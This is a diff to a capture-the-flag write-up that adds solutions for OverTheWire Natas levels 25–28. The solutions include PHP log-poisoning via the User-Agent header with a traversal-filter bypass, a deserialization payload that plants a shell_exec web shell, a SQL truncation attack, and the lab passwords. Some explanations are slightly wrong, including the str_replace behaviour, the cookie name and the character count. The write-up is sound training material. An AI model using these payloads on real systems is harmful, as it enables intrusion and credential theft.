@@ -1147,13 +1147,247 @@ ___
 **URL :** <http://natas25.natas.labs.overthewire.org/> \
 **Credentials :** *natas25:ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws*
 
+We're given a page with text that we can also change the language the text is displayed in:
 
+![Index file](/assets/images/25-1.png)
+
+We're also given the following source code:
+```php
+<?php
+
+function setLanguage() {
+    /* language setup */
+    if (array_key_exists("lang",$_REQUEST))
+        if (safeinclude("language/" . $_REQUEST["lang"] ))
+            return 1;
+    safeinclude("language/en"); 
+}
+
+function safeinclude($filename) {
+    // check for directory traversal
+    if (strstr($filename,"../")){
+        logRequest("Directory traversal attempt! fixing request.");
+        $filename=str_replace("../","",$filename);
+    }
+    // dont let ppl steal our passwords
+    if (strstr($filename,"natas_webpass")){
+        logRequest("Illegal file access detected! Aborting!");
+        exit(-1);
+    }
+    // add more checks...
+
+    if (file_exists($filename)) { 
+        include($filename);
+        return 1;
+    }
+    return 0;
+}
+
+function listFiles($path) {
+    $listoffiles=array();
+    if ($handle = opendir($path))
+        while (false !== ($file = readdir($handle)))
+            if ($file != "." && $file != "..")
+                $listoffiles[]=$file;
+    
+    closedir($handle);
+    return $listoffiles;
+} 
+
+function logRequest($message) {
+    $log="[". date("d.m.Y H::i:s",time()) ."]";
+    $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
+    $log=$log . " \"" . $message ."\"\n"; 
+    $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
+    fwrite($fd,$log);
+    fclose($fd);
+}
+?>
+```
+
+I first tried exploiting the query payload passed into the server by setting:
+```html
+lang=/etc/natas_webpass/natas26:
+```
+Unfortunately, this only produced errors:
+
+![Index file](/assets/images/25-2.png)
+
+Analysing the source code again, this function looked interesting as it was writing the value of HTTP_USER_AGENT to a file:
+```php
+function logRequest($message) {
+    $log="[". date("d.m.Y H::i:s",time()) ."]";
+    $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
+    $log=$log . " \"" . $message ."\"\n"; 
+    $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
+    fwrite($fd,$log);
+    fclose($fd);
+}
+```
+The reason this is interesting is the value associated with HTTP_USER_AGENT can be modified, which means malicious PHP code can be written to the file. We will try to write the following php code:
+```php
+<?system("cat /etc/natas_webpass/natas26")?>
+```
+Next, we need a way to navigate to the log file where this payload is stored in order to get the php code to run. From the previous error message we know we are currently at:
+```html
+var/www/natas/natas25/language
+```
+but from the source code, the log file is at:
+```php
+$fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
+```
+So then, all we need to do is traverse to:
+```html
+../logs/natas25_gdloi0iqq7dgsjvljb03lt6hod.log
+```
+But we also need to escape the filter from the server which tries to prevent directory traversal:
+```php
+if (strstr($filename,"../")) {
+    logRequest("Directory traversal attempt! fixing request.");
+    $filename=str_replace("../","",$filename);
+}
+```
+Luckily, this check is thorough enough and only removes the first occurrence of ../ so:
+```html
+....// becomes ../
+```
+Here is the curl request we will use to get the password:
+```bash
+curl -s -u natas25:ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws \
+  --cookie "PHPSESSID=gdloi0iqq7dgsjvljb03lt6hod" \
+  -H 'User-Agent: <?system("cat /etc/natas_webpass/natas26")?>' \
+  'http://natas25.natas.labs.overthewire.org/?lang=....//logs/natas25_gdloi0iqq7dgsjvljb03lt6hod.log'
+```
+
+Which returns the password:
+```html
+[08.07.2025 03::39:43] cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE <-- Password
+"Directory traversal attempt! fixing request."
+```
 #### Natas 26 Solution
 
 ___
 **URL :** <http://natas26.natas.labs.overthewire.org/> \
-**Credentials :** *natas26:*
+**Credentials :** *natas26:cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE*
 
+We're given the following source code:
+```php
+<?php
+
+class Logger{
+    private $logFile;
+    private $initMsg;
+    private $exitMsg;
+
+    function __construct($file){
+        // initialise variables
+        $this->initMsg="#--session started--#\n";
+        $this->exitMsg="#--session end--#\n";
+        $this->logFile = "/tmp/natas26_" . $file . ".log";
+
+        // write initial message
+        $fd=fopen($this->logFile,"a+");
+        fwrite($fd,$this->initMsg);
+        fclose($fd);
+    }
+
+    function log($msg){
+        $fd=fopen($this->logFile,"a+");
+        fwrite($fd,$msg."\n");
+        fclose($fd);
+    }
+
+    function __destruct(){
+        // write exit message
+        $fd=fopen($this->logFile,"a+");
+        fwrite($fd,$this->exitMsg);
+        fclose($fd);
+    }
+}
+
+function showImage($filename){
+    if(file_exists($filename))
+        echo "<img src=\"$filename\">";
+}
+
+function drawImage($filename){
+    $img=imagecreatetruecolor(400,300);
+    drawFromUserdata($img);
+    imagepng($img,$filename);
+    imagedestroy($img);
+}
+
+function drawFromUserdata($img){
+    if( array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
+        array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
+
+        $color=imagecolorallocate($img,0xff,0x12,0x1c);
+        imageline($img,$_GET["x1"], $_GET["y1"],
+                        $_GET["x2"], $_GET["y2"], $color);
+    }
+
+    if (array_key_exists("drawing", $_COOKIE)){
+        $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
+        if($drawing)
+            foreach($drawing as $object)
+                if( array_key_exists("x1", $object) &&
+                    array_key_exists("y1", $object) &&
+                    array_key_exists("x2", $object) &&
+                    array_key_exists("y2", $object)){
+
+                    $color=imagecolorallocate($img,0xff,0x12,0x1c);
+                    imageline($img,$object["x1"],$object["y1"],
+                            $object["x2"] ,$object["y2"] ,$color);
+
+                }
+    }
+}
+
+function storeData(){
+    $new_object=array();
+
+    if(array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
+        array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
+        $new_object["x1"]=$_GET["x1"];
+        $new_object["y1"]=$_GET["y1"];
+        $new_object["x2"]=$_GET["x2"];
+        $new_object["y2"]=$_GET["y2"];
+    }
+
+    if (array_key_exists("drawing", $_COOKIE)){
+        $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
+    }
+    else{
+        // create new array
+        $drawing=array();
+    }
+
+    $drawing[]=$new_object;
+    setcookie("drawing",base64_encode(serialize($drawing)));
+}
+?>
+```
+The first thing that catches my eye is the use of unserialize() which leads me to think there could be an object deserialization vulnerability. I noticed we're given a cookie called drawing:
+
+![Index file](/assets/images/26-1.png)
+
+This is what 'drawing' looks like after unserialisation:
+
+![Index file](/assets/images/26-2.png)
+
+Next, we will try to serialize our malicious code and replace it with the existing 'drawing' cookie. We will replace the existing Logger class with our own Logger class that will write the following code:
+```php
+<?php echo shell_exec('cat /etc/natas_webpass/natas27'); ?>
+```
+to a log file that we have access to:
+```html
+/var/www/natas/natas26/img/natas26_v7r8ankdhkfvuo3jtpe6pe7dnu.php
+```
+The reason we chose this is because we currently have access to:
+```html
+img/natas26_v7r8ankdhkfvuo3jtpe6pe7dnu.png
+```
+Below is everything we will serialize:
 ```php
 class Logger{
     private $logFile;
@@ -1161,26 +1395,240 @@ class Logger{
 
     function __construct(){
         $this->exitMsg= "<?php echo shell_exec('cat /etc/natas_webpass/natas27'); ?>";
-        $this->logFile = "/var/www/natas/natas26/img/natas26_v7r8ankdhkfvuo3jtpe6pe7dnu.php";
+        $this->logFile = "/var/www/natas/natas26/img/natas26_2gfq31bqb22koati25vujtiof1.php";
     }
 }
 
 $logger = new Logger();
-echo base64_encode(serialize($logger));
 ```
+After serializing and base64 encoding, this will give:
+```html
+Tzo2OiJMb2dnZXIiOjI6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czo2NToiL3Zhci93d3cvbmF0YXMvbmF0YXMyNi9pbWcvbmF0YXMyNl8yZ2ZxMzFicWIyMmtvYXRpMjV2dWp0aW9mMS5waHAiO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo1OToiPD9waHAgZWNobyBzaGVsbF9leGVjKCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4iO30
+```
+
+Next, replace the value of the existing 'data' cookie with the encoding you just generated and refresh. Navigate to http://natas26.natas.labs.overthewire.org/img/natas26_2gfq31bqb22koati25vujtiof1.php and the password will be on the page:
+
+![Index file](/assets/images/26-3.png)
 
 #### Natas 27 Solution
 
 ___
 **URL :** <http://natas27.natas.labs.overthewire.org/> \
-**Credentials :** *natas27:*
+**Credentials :** *natas27:u3RRffXjysjgwFU6b9xa23i6prmUsYne*
 
+We're given the following source code:
+```php
+<?php
+// database gets cleared every 5 min
+
+
+/*
+CREATE TABLE `users` (
+  `username` varchar(64) DEFAULT NULL,
+  `password` varchar(64) DEFAULT NULL
+);
+*/
+
+
+function checkCredentials($link,$usr,$pass){
+
+    $user=mysqli_real_escape_string($link, $usr);
+    $password=mysqli_real_escape_string($link, $pass);
+
+    $query = "SELECT username from users where username='$user' and password='$password' ";
+    $res = mysqli_query($link, $query);
+    if (mysqli_num_rows($res) > 0) {
+        return True;
+    }
+    return False;
+}
+
+
+function validUser($link,$usr) {
+
+    $user=mysqli_real_escape_string($link, $usr);
+
+    $query = "SELECT * from users where username='$user'";
+    $res = mysqli_query($link, $query);
+    if ($res) {
+        if (mysqli_num_rows($res) > 0) {
+            return True;
+        }
+    }
+    return False;
+}
+
+
+function dumpData($link,$usr){
+
+    $user=mysqli_real_escape_string($link, trim($usr));
+
+    $query = "SELECT * from users where username='$user'";
+    $res = mysqli_query($link, $query);
+    if ($res) {
+        if (mysqli_num_rows($res) > 0) {
+            while ($row = mysqli_fetch_assoc($res)) {
+                // thanks to Gobo for reporting this bug!
+                //return print_r($row);
+                return print_r($row,true);
+            }
+        }
+    }
+    return False;
+}
+
+
+function createUser($link, $usr, $pass){
+
+    if ($usr != trim($usr)) {
+        echo "Go away hacker";
+        return False;
+    }
+    $user=mysqli_real_escape_string($link, substr($usr, 0, 64));
+    $password=mysqli_real_escape_string($link, substr($pass, 0, 64));
+
+    $query = "INSERT INTO users (username,password) values ('$user','$password')";
+    $res = mysqli_query($link, $query);
+    if (mysqli_affected_rows($link) > 0) {
+        return True;
+    }
+    return False;
+}
+
+
+if (array_key_exists("username", $_REQUEST) and array_key_exists("password", $_REQUEST)) {
+    $link = mysqli_connect('localhost', 'natas27', '<censored>');
+    mysqli_select_db($link, 'natas27');
+
+
+    if (validUser($link,$_REQUEST["username"])) {
+        //user exists, check creds
+        if (checkCredentials($link,$_REQUEST["username"],$_REQUEST["password"])) {
+            echo "Welcome " . htmlentities($_REQUEST["username"]) . "!<br>";
+            echo "Here is your data:<br>";
+            $data=dumpData($link,$_REQUEST["username"]);
+            print htmlentities($data);
+        } else{
+            echo "Wrong password for user: " . htmlentities($_REQUEST["username"]) . "<br>";
+        }
+    } else {
+        //user doesn't exist
+        if (createUser($link,$_REQUEST["username"],$_REQUEST["password"])) {
+            echo "User " . htmlentities($_REQUEST["username"]) . " was created!";
+        }
+    }
+
+    mysqli_close($link);
+}
+?>
+```
+I started by playing with the website and found that the server will create a new user if I try to log in as a user that doesn't exist yet:
+
+![Index file](/assets/images/27-1.png)
+
+I also get a data dump about my account if I try to login as an existing user:
+
+![Index file](/assets/images/27-2.png)
+
+I then tried to login as natas28, however, instead of creating a new user I get something else:
+
+![Index file](/assets/images/27-3.png)
+
+It seems this level likely involves finding the password for natas28, and then maybe the password for the next level will be provided in the data dump. So I then tested for SQL vulnerabilities using a simple SQL injection:
+```sql
+' OR 1=1; #
+```
+
+Unfortunately, this did not work as the source code uses mysqli_real_escape_string():
+
+![Index file](/assets/images/27-4.png)
+
+After reading the documentation for mysqli_real_escape_string() and looking for potential vulnerabilities, it seemed unlikely there was any SQL injection vulnerabilities. I then tried focusing on this particular function:
+```php
+function createUser($link, $usr, $pass){
+
+    if ($usr != trim($usr)) {
+        echo "Go away hacker";
+        return False;
+    }
+    $user=mysqli_real_escape_string($link, substr($usr, 0, 64));
+    $password=mysqli_real_escape_string($link, substr($pass, 0, 64));
+
+    $query = "INSERT INTO users (username,password) values ('$user','$password')";
+    $res = mysqli_query($link, $query);
+    if (mysqli_affected_rows($link) > 0) {
+        return True;
+    }
+    return False;
+}
+```
+
+I had a closer look at dumpData() and realised since it calls trim(), if I was able to create a user called natas28 with multiple spaces this would technically evaluate to just natas28 and also return me info about the actual natas28 user.
+```php
+function dumpData($link,$usr){
+    $user=mysqli_real_escape_string($link, trim($usr));
+
+    $query = "SELECT * from users where username='$user'";
+    $res = mysqli_query($link, $query);
+    if ($res) {
+        if (mysqli_num_rows($res) > 0) {
+            while ($row = mysqli_fetch_assoc($res)) {
+                // thanks to Gobo for reporting this bug!
+                //return print_r($row);
+                return print_r($row,true);
+            }
+        }
+    }
+    return False;
+}
+```
+We will use curl to make the request since the browser treats whitespaces weirdly:
+```html
+curl -u natas27:u3RRffXjysjgwFU6b9xa23i6prmUsYne -d 'username=natas28%20&password=password' http://natas27.natas.labs.overthewire.org/index.php
+```
+Unfortunately, this only returns:
+```html
+Go away hacker
+```
+because of this check on the server when we try to create a new user where trim() removes all trailing whitespace:
+```php
+if ($usr != trim($usr)) {
+    echo "Go away hacker";
+    return False;
+}
+```
+We could add a random character to the end, like the following:
+```html
+natas28       X
+```
+but when dumpdata() is called, trim() won't turn it to natas28 and we will only get the data for natas28       X:
+```html
+Welcome natas28 X!<br>Here is your data:<br>Array
+(
+    [username] =&gt; natas28 X
+    [password] =&gt; password
+)
+```
+The key is in the next few lines in createUser():
+```php
+$user=mysqli_real_escape_string($link, substr($usr, 0, 64));
+$password=mysqli_real_escape_string($link, substr($pass, 0, 64));
+$query = "INSERT INTO users (username,password) values ('$user','$password')";
+```
+If we create a user beginning with natas28, 58 whitespaces and then a random character like A, this will pass the "Go away hacker" check, but then instead of adding natas28{58_spaces}X to the database, it will instead create natas28{58_spaces} since the substr() function has been specified to only take 65 characters. Then, all we need to do is log in as natas28{58_spaces} (since it exists now) which will give us the password found in the data dump:
+```html
+Welcome natas28                                                         !<br>Here is your data:<br>Array
+(
+    [username] =&gt; natas28
+    [password] =&gt; 1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj
+)
+```
 
 #### Natas 28 Solution
 
 ___
 **URL :** <http://natas28.natas.labs.overthewire.org/> \
-**Credentials :** *natas28:*
+**Credentials :** *natas28:1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj*
 
 #### Natas 29 Solution
 
